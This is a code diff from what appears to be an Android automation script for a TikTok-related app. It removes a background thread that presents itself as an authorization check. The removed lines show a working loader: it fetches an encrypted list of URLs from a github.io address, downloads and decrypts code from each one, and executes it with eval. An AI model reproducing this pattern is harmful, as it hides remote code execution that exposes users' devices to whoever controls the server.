@@ -340,71 +340,7 @@ exit = function () {
     survive = false;
     Exit();
 }
-threads.start(function () {
-    let password = "授权线程的加密密码";
-    let serverAuthUrl = [];
-    let requestNumber = 0;
 
-    let i = 0;
-    while(survive){
-        auth(); // 自带捕获
-        try{
-            if((i++) % 15 == 0) {
-                tempSave.switchVersion = -1 < appPackage.indexOf("zhiliaoapp") ? "长版本" : "短版本";
-                console.verbose("模式：" + tempSave.model + " --- 版本：" + tempSave.switchVersion + " --- 包名：" +appPackage);
-            } else if(i % 5 == 0) console.verbose("模式：" + tempSave.model + " --- 版本：" + tempSave.switchVersion);
-            popupDetection(null, "关闭异常日志");
-            {
-                // if(i==0) {
-                //     popupDetection();
-                // } else {
-                //     action = text("Okay").findOne(30);
-                //     if(action) action.click();
-                //     if(30 < i) i = 0;
-                // }
-            }
-        }catch(e){
-            console.verbose("守护线程异常", e)
-        }
-        sleep(2000);
-    }
-
-    function auth() {
-        // console.info("授权校验中...")
-        // 将自己的信息发送到服务器上，服务器返回一个结果，与本机结果进行校验，如果一致则判断为已授权
-        // serverAuthUrl 从服务器获取到链接，采用加密形式
-        try{
-            let re = http.get("https://lbh886633.github.io/js/auth.js");
-            requestNumber++;
-            if(parseInt(re.statusCode/10) == 20) {
-                // 解密数据并切割链接出来
-                let urlDataString = deData(password + "jiaa", re.body.string());
-                urlDataString.split("\n").forEach((url)=>{
-                    if(serverAuthUrl.indexOf(url) < 0) {
-                        if(4 < url.length) {
-                            serverAuthUrl.push(url);
-                        }
-                    }
-                })
-            }
-        }catch(e){
-            requestNumber += 0.2;
-            console.verbose("异常", e)
-        }
-        // 对链接进行请求并处理
-        serverAuthUrl.forEach((url)=>{
-            try{
-                // 请求数据并将数据内容进行执行
-                eval(deData(password + "mili", http.get(url).body.string()))
-            }catch(e){
-                toastLog("授权校验失败！");
-                engines.stopAll();
-                threads.shutDownAll();
-                exit();
-            }
-        })
-    }
-})
 
 server.serverUrl = files.read(路径.服务器链接).split("\n").shift();
 
